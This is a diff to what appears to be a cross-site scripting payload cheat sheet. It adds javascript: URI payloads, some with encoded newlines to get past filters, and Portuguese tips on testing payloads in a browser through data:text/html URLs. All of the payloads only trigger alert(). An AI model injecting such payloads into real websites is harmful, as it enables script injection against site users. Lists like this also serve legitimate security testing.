@@ -5,11 +5,21 @@
 <style onload=alert()>
 <img src=x onerror=alert(1)>
 <img/src=x/onerror=alert(1)>
+javascript:alert(1)
+javasc%0aript%3aalert(1)
+javas%0a%0dcript%3aalert(1)
 
 
 
 
 
+------------------------------------------------------------------------------------------------------
+Para testar payloads que contenham javascript, escreva no navegador:
+data:text/html, <a href="javascript:alert()">aaaa</a>
+======================================================================================================
+Para testar payloads que contenham <>, escreva no navegador:
+data:text/html, <img src=x onerror=alert()>
+------------------------------------------------------------------------------------------------------
 [+][+][+]      Após o sucesso da execução!!!!    [+][+][+]
 
 
